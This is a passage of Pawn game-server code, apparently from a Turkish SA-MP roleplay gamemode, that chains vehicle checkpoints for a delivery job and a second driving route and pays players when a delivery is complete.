		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2402.2273,44.1654,26.4263, 7.5);
				SevkiyatCheckpoint[playerid] = 30;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 30)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2387.9146,90.4935,26.4659, 7.5);
				SevkiyatCheckpoint[playerid] = 31;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 31)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2303.6050,92.6173,26.4336, 7.5);
				SevkiyatCheckpoint[playerid] = 32;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 32)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2293.3784,45.0226,26.4316, 7.5);
				SevkiyatCheckpoint[playerid] = 33;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 33)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2204.6501,43.9663,26.4311, 7.5);
				SevkiyatCheckpoint[playerid] = 34;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 34)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2093.6565,43.9388,26.4299, 7.5);
				SevkiyatCheckpoint[playerid] = 35;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 35)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1976.6792,42.4681,32.2680, 7.5);
				SevkiyatCheckpoint[playerid] = 36;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 36)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1818.8490,72.1066,35.3783, 7.5);
				SevkiyatCheckpoint[playerid] = 37;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 37)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1649.3337,134.1227,30.6179, 7.5);
				SevkiyatCheckpoint[playerid] = 38;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 38)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1427.3209,35.8690,31.8882, 7.5);
				SevkiyatCheckpoint[playerid] = 39;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 39)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1295.4337,-80.3061,36.6020, 7.5);
				SevkiyatCheckpoint[playerid] = 40;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 40)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1125.9340,-180.6167,42.0043, 7.5);
				SevkiyatCheckpoint[playerid] = 41;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 41)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1001.1887,-181.1648,20.7765, 7.5);
				SevkiyatCheckpoint[playerid] = 42;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 42)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 723.9865,-158.9402,20.6372, 7.5);
				SevkiyatCheckpoint[playerid] = 43;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 43)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 531.4632,-139.5089,37.9139, 7.5);
				SevkiyatCheckpoint[playerid] = 44;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 44)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 335.6239,-139.5920,1.5196, 7.5);
				SevkiyatCheckpoint[playerid] = 45;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 45)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 283.4519,-149.6757,1.5242, 7.5);
				SevkiyatCheckpoint[playerid] = 46;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 46)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 279.9702,-208.2796,1.5188, 7.5);
				SevkiyatCheckpoint[playerid] = 47;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 47)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 106.7331,-210.4357,1.5251, 7.5);
				SevkiyatCheckpoint[playerid] = 48;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 48)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 119.9185,-269.4603,1.6718, 7.5);
				SevkiyatCheckpoint[playerid] = 49;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 49)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				GameTextForPlayer(playerid, "bekleyiniz", 4000, 1);
				Bilgi(playerid, "Yükünüzü býrakýyorsunuz, lütfen bekleyiniz.");
				SetTimerEx("SevkiyatIkinciTimer", 3500, 0, "i", playerid);
				TogglePlayerControllable(playerid, 0);
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 50)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 81.8434,-261.1215,1.6719, 7.5);
				SevkiyatCheckpoint[playerid] = 51;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 51)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 44.2383,-207.5448,1.5576, 7.5);
				SevkiyatCheckpoint[playerid] = 52;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 52)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, -123.2515,-186.7326,1.9443, 7.5);
				SevkiyatCheckpoint[playerid] = 53;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 53)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, -274.6026,-154.9806,2.5068, 7.5);
				SevkiyatCheckpoint[playerid] = 54;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 54)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, -297.7919,-36.0109,1.1797, 7.5);
				SevkiyatCheckpoint[playerid] = 55;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 55)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, -202.2788,231.5715,12.1627, 7.5);
				SevkiyatCheckpoint[playerid] = 56;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 56)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 124.0276,82.7340,2.1728, 7.5);
				SevkiyatCheckpoint[playerid] = 57;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 57)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 475.6317,198.8659,11.2600, 7.5);
				SevkiyatCheckpoint[playerid] = 58;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 58)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 755.6987,320.2975,19.9766, 7.5);
				SevkiyatCheckpoint[playerid] = 59;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 59)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 958.9227,381.6554,19.9766, 7.5);
				SevkiyatCheckpoint[playerid] = 60;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 60)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1051.9950,526.2386,19.9844, 7.5);
				SevkiyatCheckpoint[playerid] = 61;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 61)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1339.5254,461.8097,19.9766, 7.5);
				SevkiyatCheckpoint[playerid] = 62;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 62)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 1748.5444,383.8507,19.7019, 7.5);
				SevkiyatCheckpoint[playerid] = 63;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 63)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2006.4000,336.1118,28.3350, 7.5);
				SevkiyatCheckpoint[playerid] = 64;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 64)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2074.4856,249.5237,24.1200, 7.5);
				SevkiyatCheckpoint[playerid] = 65;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 65)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2336.6213,210.5844,26.4576, 7.5);
				SevkiyatCheckpoint[playerid] = 66;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 66)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2346.3726,276.4414,26.4296, 7.5);
				SevkiyatCheckpoint[playerid] = 67;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 67)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2623.6147,305.3854,37.1020, 7.5);
				SevkiyatCheckpoint[playerid] = 68;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 68)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2757.4854,18.9885,31.4460, 7.5);
				SevkiyatCheckpoint[playerid] = 69;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 69)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2706.0505,-246.4989,29.8030, 7.5);
				SevkiyatCheckpoint[playerid] = 70;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 70)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2823.7458,-482.4350,18.6721, 7.5);
				SevkiyatCheckpoint[playerid] = 71;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 71)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2875.2488,-657.5584,10.9297, 7.5);
				SevkiyatCheckpoint[playerid] = 72;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 72)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2872.6206,-1185.1086,10.9690, 7.5);
				SevkiyatCheckpoint[playerid] = 73;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 73)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2904.0972,-1453.4587,10.9688, 7.5);
				SevkiyatCheckpoint[playerid] = 74;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 74)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2850.3196,-1678.9340,10.9683, 7.5);
				SevkiyatCheckpoint[playerid] = 75;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 75)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2822.8564,-1939.3019,11.0313, 7.5);
				SevkiyatCheckpoint[playerid] = 76;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 76)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2781.9666,-2134.5146,11.0235, 7.5);
				SevkiyatCheckpoint[playerid] = 77;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 77)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2519.5518,-2154.6799,13.4662, 7.5);
				SevkiyatCheckpoint[playerid] = 78;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 78)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2295.5662,-2257.1067,13.4688, 7.5);
				SevkiyatCheckpoint[playerid] = 79;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 79)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2192.6384,-2359.3511,13.4688, 7.5);
				SevkiyatCheckpoint[playerid] = 80;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 80)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2159.1868,-2482.6733,13.4688, 7.5);
				SevkiyatCheckpoint[playerid] = 81;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 81)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2212.1257,-2498.3516,13.4930, 7.5);
				SevkiyatCheckpoint[playerid] = 82;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 82)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2258.9075,-2406.9890,13.4991, 7.5);
				SevkiyatCheckpoint[playerid] = 83;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 83)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2284.2688,-2353.2170,13.6406, 7.5);
				SevkiyatCheckpoint[playerid] = 84;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 84 && !GetPlayerVehicleSeat(playerid))
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10)
		    {
		        new string[128];
			    new vehicleid = GetPlayerVehicleID(playerid);
			    MotoruKapat(vehicleid);
			    SetVehiclePosEx(vehicleid, Arac[vehicleid][aposx],Arac[vehicleid][aposy],Arac[vehicleid][aposz]);
			    RepairVehicleEx(vehicleid);
			    RemovePlayerFromVehicle(playerid);
				DisablePlayerCheckpoint(playerid);
				SevkiyatCheckpoint[playerid] = 0;
				SevkiyatGorev[playerid] = 0;
				new ucret;
				if(Arac[vehicleid][atip] == 3) {
					ucret = floatround(750*UstalikKatSayi(playerid));
					GivePlayerCash(playerid, ucret);
					format(string,sizeof(string),"Sevkiyatý baþarýyla tamamladýnýz, %d$ kazandýnýz.",ucret);
					Bilgi(playerid, string);
				}
				else {
				    ucret = floatround((950-Arac[vehicleid][agelir])*UstalikKatSayi(playerid));
					GivePlayerCash(playerid, ucret);
					format(string,sizeof(string), "%s þirketiyle çalýþtýðýnýz için teþekkür ederiz, ücretiniz %d$.",Isyeri[Arac[vehicleid][aisyeri]][iad],ucret);
					Bilgi(playerid, string);
					Isyeri[Arac[vehicleid][aisyeri]][ikasa] += Arac[vehicleid][agelir];
					IsyeriKaydet(Arac[vehicleid][aisyeri]);
				}
				Aractamiri(vehicleid);
				format(string, sizeof(string), "[MESLEK] Sevkiyat mesleginden %d$ kazandi. Toplam ustundeki: %d$ Bankadaki: %d$", ucret, Karakter[playerid][para], BankaPara(playerid));
				Log(playerid, string);
			}
		}
	}
	if(SicilTCheckpoint[playerid] == 1)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2200.8821,-1976.6831,13.3894, 7.5);
			SicilTCheckpoint[playerid] = 2;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 2)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2219.7917,-1911.3086,13.1911, 7.5);
			SicilTCheckpoint[playerid] = 3;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 3)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2218.4622,-1764.3717,13.1918, 7.5);
			SicilTCheckpoint[playerid] = 4;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 4)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2228.9666,-1666.6913,14.8909, 7.5);
			SicilTCheckpoint[playerid] = 5;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 5)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2214.1123,-1568.6744,23.2605, 7.5);
			SicilTCheckpoint[playerid] = 6;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 6)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2214.7395,-1400.1683,23.6523, 7.5);
			SicilTCheckpoint[playerid] = 7;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 7)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2271.6042,-1387.0638,23.6639, 7.5);
			SicilTCheckpoint[playerid] = 8;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 8)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2306.2219,-1337.8049,23.6787, 7.5);
			SicilTCheckpoint[playerid] = 9;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 9)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2305.9316,-1220.3602,23.6753, 7.5);
			SicilTCheckpoint[playerid] = 10;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 10)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2305.7927,-1164.7917,26.4379, 7.5);
			SicilTCheckpoint[playerid] = 11;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 11)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2449.3918,-1156.6029,33.9481, 7.5);
			SicilTCheckpoint[playerid] = 12;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 12)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2632.5386,-1155.0527,51.8453, 7.5);
			SicilTCheckpoint[playerid] = 13;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 13)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2845.2100,-1142.4333,12.2093, 7.5);
			SicilTCheckpoint[playerid] = 14;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 14)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2891.2869,-1086.9678,10.7065, 7.5);
			SicilTCheckpoint[playerid] = 15;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 15)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2895.2200,-856.1902,10.7067, 7.5);
			SicilTCheckpoint[playerid] = 16;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 16)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2897.1831,-686.9257,10.6697, 7.5);
			SicilTCheckpoint[playerid] = 17;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 17)
	{
